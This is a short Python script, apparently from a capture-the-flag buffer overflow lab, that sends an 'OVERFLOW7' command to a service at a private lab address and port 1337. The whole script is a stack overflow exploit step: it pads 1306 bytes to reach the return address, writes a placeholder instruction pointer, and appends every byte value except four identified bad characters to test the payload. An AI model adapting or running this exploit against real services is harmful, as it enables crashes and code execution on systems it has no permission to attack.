import struct, socket



host, port = '10.10.243.3', 1337
all_chars = bytearray(range(1,256))

bad_chars = [
b'\x8c',
b'\xae',
b'\xbe',
b'\xfb',
]

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')


command = b'OVERFLOW7 '
length = 1500
new_eip = b'BBBB'
offset = 1306
payload = b''.join([

command,
b'A'*offset,
new_eip,
all_chars,
b'C' * (length - offset - len(new_eip) - len(all_chars)),

])



with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
